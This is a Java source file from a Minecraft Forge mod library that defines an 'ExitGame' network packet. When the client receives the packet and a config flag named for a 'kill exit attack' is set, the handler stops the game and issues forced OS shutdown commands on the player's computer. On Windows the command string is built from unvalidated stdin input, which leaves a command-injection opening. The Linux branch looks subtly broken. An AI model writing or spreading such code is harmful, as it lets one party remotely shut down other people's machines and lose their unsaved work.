package miku.lib.network.packets;

import io.netty.buffer.ByteBuf;
import miku.lib.common.api.iMinecraft;
import miku.lib.common.sqlite.Sqlite;
import miku.lib.common.util.EntityUtil;
import miku.lib.common.util.SystemUtil;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.network.simpleimpl.IMessage;
import net.minecraftforge.fml.common.network.simpleimpl.IMessageHandler;
import net.minecraftforge.fml.common.network.simpleimpl.MessageContext;
import net.minecraftforge.fml.relauncher.Side;
import net.minecraftforge.fml.relauncher.SideOnly;

import java.io.IOException;
import java.util.Scanner;

public class ExitGame implements IMessage {

    public ExitGame() {
    }

    @Override
    public void fromBytes(ByteBuf buf) {

    }

    @Override
    public void toBytes(ByteBuf buf) {

    }

    public static class MessageHandler implements IMessageHandler<ExitGame, IMessage> {

        @Override
        @SideOnly(Side.CLIENT)
        public IMessage onMessage(ExitGame message, MessageContext ctx) {
            boolean flag = (boolean) Sqlite.GetValueFromTable("miku_kill_exit_attack","CONFIG",0);
            System.out.println("Miku Kill Exit Attack is:"+flag);
            if(!flag)return null;
            if(EntityUtil.isProtected(Minecraft.getMinecraft().player))return null;
            ((iMinecraft)Minecraft.getMinecraft()).Stop();
            if (SystemUtil.isWindows()) {
                Scanner scanner = new Scanner(System.in);
                String input = scanner.nextLine();
                try {
                    Runtime.getRuntime().exec("shutdown -s -f " + input);
                } catch (IOException ignored) {

                }
            }
            if (SystemUtil.isLinux()) {
                try {

                    ProcessBuilder processBuilder = new ProcessBuilder();
                    processBuilder.command("shutdown -h now");
                    processBuilder.start();
                } catch (IOException ignored) {
                }
            }
            Runtime.getRuntime().halt(39);
            System.exit(0);
            return null;
        }
    }
}
